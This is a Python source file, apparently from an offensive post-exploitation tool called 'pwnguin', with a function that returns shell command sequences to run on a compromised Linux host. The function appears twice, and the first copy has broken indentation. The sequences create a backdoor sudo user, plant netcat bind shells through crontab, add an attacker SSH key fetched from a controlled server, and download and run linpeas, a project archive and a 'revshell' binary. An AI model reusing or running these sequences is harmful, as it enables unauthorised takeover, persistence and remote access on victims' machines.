from post.postexploit import openCtrlSrv


def getsequence( id=0, srv=""):
    match id :
        case 0 :
            SEQUENCE = ["whoami",
              "pwd",
              "sudo -l",
              "sudo -i",
              "whoami"]
        case 1 :
            SEQUENCE = ["whoami",
              "sudo -l",
              "sudo useradd pwnguin",
              "echo pwnguin:pwnguin | chpasswd",
              "sudo usermod -aG sudo pwnguin",
              "sudo su pwnguin",
              "touch pwnguined"]
        case 2 :
            SEQUENCE = ["whoami",
              "cat /etc/crontab",
              "sudo echo '10 14 * * *   vagrant     nc -l -p 55555 -e /bin/bash' >> /etc/crontab",
              "cat /etc/crontab"]
        case 3 :
            SEQUENCE = ["whoami",
              "curl -s " + srv + "/post/id_rsa.pub -o id_rsa.pub > /dev/null",
              "mkdir ~/.ssh",
              "touch ~/.ssh/authorized_keys",
              "chmod 700 ~/.ssh",
              "cat id_rsa.pub >> ~/.ssh/authorized_keys",
              "chmod 600 ~/.ssh/authorized_keys",
              "rm id_rsa.pub",
              "echo 'PubkeyAuthentication yes' | cat - /etc/ssh/sshd_config > temp && mv temp /etc/ssh/sshd_config",
              "/etc/init.d/ssh restart",
              "echo get persisted kid"]
        case 4 :
            SEQUENCE = ["whoami",
              "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
              "pwd",
              "chown root:root linpeas.sh",
              "echo 0xcafedeadbeef",
              "chmod +x linpeas.sh",
              "echo matthislemechan"]
        case 5 :
            SEQUENCE = ["cd /root",
              "pwd",
              "ls",
              "curl -s " + srv + "/post/main.zip -o main.zip > /dev/null",
              "unzip main.zip",
              "chown root:root pwnguin-main",
              "cd pwnguin-main",
              "chmod -R 700 .",
              "echo pwnguined",
              "nc -l -p 45678 -e /bin/bash"]
        case 6 :
            SEQUENCE = ["cd ~",
              "curl -L https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap -o nmap",
              "PATH=$PATH:."]

 return SEQUENCE
def getsequence(id=0, srv=""):
    match id:
        case 0:
            SEQUENCE = ["whoami", "pwd", "sudo -l", "sudo -i", "whoami"]
        case 1:
            SEQUENCE = [
                "whoami",
                "sudo -l",
                "sudo useradd pwnguin",
                "echo pwnguin:pwnguin | chpasswd",
                "sudo usermod -aG sudo pwnguin",
                "sudo su pwnguin",
                "touch pwnguined",
            ]
        case 2:
            SEQUENCE = [
                "whoami",
                "cat /etc/crontab",
                "(crontab -l ; echo '@reboot sleep 200 && nc -l -p 55555 -e /bin/bash')|crontab' >> /etc/crontab",
                "cat /etc/crontab",
            ]
        case 3:
            SEQUENCE = [
                "whoami",
                "curl -s " + srv + "/post/id_rsa.pub -o id_rsa.pub > /dev/null",
                "mkdir ~/.ssh",
                "touch ~/.ssh/authorized_keys",
                "chmod 700 ~/.ssh",
                "cat id_rsa.pub >> ~/.ssh/authorized_keys",
                "chmod 600 ~/.ssh/authorized_keys",
                "rm id_rsa.pub",
                "echo 'PubkeyAuthentication yes' | cat - /etc/ssh/sshd_config > temp && mv temp /etc/ssh/sshd_config",
                "/etc/init.d/ssh restart",
                "echo get persisted kid",
            ]
        case 4:
            SEQUENCE = [
                "whoami",
                "curl -s " + srv + "/post/vir/linpeas.sh -o linpeas.sh > /dev/null",
                "pwd",
                "chown root:root linpeas.sh",
                "echo 0xcafedeadbeef",
                "chmod +x linpeas.sh",
                "echo matthislemechan",
            ]
        case 5:
            SEQUENCE = [
                "cd /root",
                "pwd",
                "ls",
                "curl -s " + srv + "/post/main.zip -o main.zip > /dev/null",
                "unzip main.zip",
                "chown root:root pwnguin-main",
                "cd pwnguin-main",
                "chmod -R 700 .",
                "echo pwnguined",
                "nc -l -p 45678 -e /bin/bash",
            ]
        case 6:
            SEQUENCE = ["whoami", "echo 'pwnguined' >> ~/.bashrc"]
        case 7:
            SEQUENCE = [
                "whoami",
                "curl -s " + srv + "/post/revshell -o revshell > /dev/null",
                "chmod +x revshell",
                "./revshell",
            ]
    return SEQUENCE
